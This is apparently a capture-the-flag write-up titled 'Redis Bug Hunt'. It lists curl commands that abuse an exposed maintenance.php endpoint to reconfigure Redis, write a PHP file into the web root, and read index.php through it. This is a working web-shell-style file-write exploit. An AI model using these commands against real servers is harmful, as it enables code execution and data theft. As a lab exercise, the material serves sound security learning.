# Redis Bug Hunt
Location: Kitchen

The objective is to retrieve the index.php file from the server.

This can be done using these commands:
```
curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
curl http://localhost/maintenance.php?cmd=config,set,dbfilename,m.php
curl 'http://localhost/maintenance.php?cmd=set,test,<?php%20echo%20file_get_contents("index.php");%20?>'
curl http://localhost/maintenance.php?cmd=save
curl http://localhost/m.php --output -
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbMjg4Njk3MDE5LDQ3ODk1OTI2Nyw3MzA5OT
gxMTZdfQ==
-->